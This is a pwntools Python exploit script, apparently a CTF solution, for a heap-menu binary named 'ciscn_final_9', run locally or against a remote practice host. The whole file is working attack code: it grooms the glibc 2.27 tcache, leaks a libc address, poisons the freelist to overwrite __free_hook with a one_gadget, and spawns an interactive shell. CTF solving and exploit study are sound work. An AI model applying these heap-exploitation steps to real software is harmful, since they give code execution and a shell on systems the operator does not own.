import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_9')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_final_9')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26163)
			elf=ELF('./ciscn_final_9')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('which command?','1')
			io.sendlineafter('size',str(a))
			io.sendafter('content',b)

		def show(a):
			io.sendlineafter('which command?','3')
			io.sendlineafter('index',str(a))

		def delete(a):
			io.sendlineafter('which command?','2')
			io.sendlineafter('index',str(a))

		add(0xf0,'aaa\n')	
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		delete(9)
		for i in range(9):
			delete(i)
		for i in range(7):
			add(0xf0,'aaa\n')

		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		add(0xf0,'aaa\n')
		for i in range(6):
			delete(i)	
		delete(8)
		delete(7)
		add(0xf8,'aaa\n')
		delete(6)
		delete(9)

		for i in range(8):
			add(0xf0,'/bin/sh\n')


		show(0)
		io.recvuntil('> ')
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		add(0xf0,'aaa\n')
		delete(2)
		delete(1)
		delete(0)
		delete(9)
		add(0xf0,p64(libc.sym['__free_hook']))
		add(0xf0,p64(libc.sym['__free_hook']))
		add(0xf0,p64(libc_base+one_gadget[1]))
		delete(3)
		
		


		
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue